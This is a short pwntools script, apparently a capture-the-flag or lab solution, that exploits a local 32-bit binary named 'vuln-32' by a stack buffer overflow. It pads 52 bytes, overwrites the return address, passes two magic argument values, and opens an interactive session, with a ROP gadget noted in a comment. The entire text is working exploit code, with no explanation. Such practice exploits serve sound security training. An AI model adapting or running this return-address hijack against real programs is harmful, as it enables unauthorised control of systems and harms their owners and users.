from pwn import *

context.binary = ELF("./vuln-32")

addr = 0x080491c7

c0ded00d = 0xc0ded00d
deadc0de = 0xdeadc0de

offset = 52

payload = flat([
    b"A" * offset,
    addr,
    0x0,
    deadc0de,
    c0ded00d,
])

p = process()

# gdb.attach(p)
p.recvline()
p.sendline(payload)
p.interactive()
# 0x08049268 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret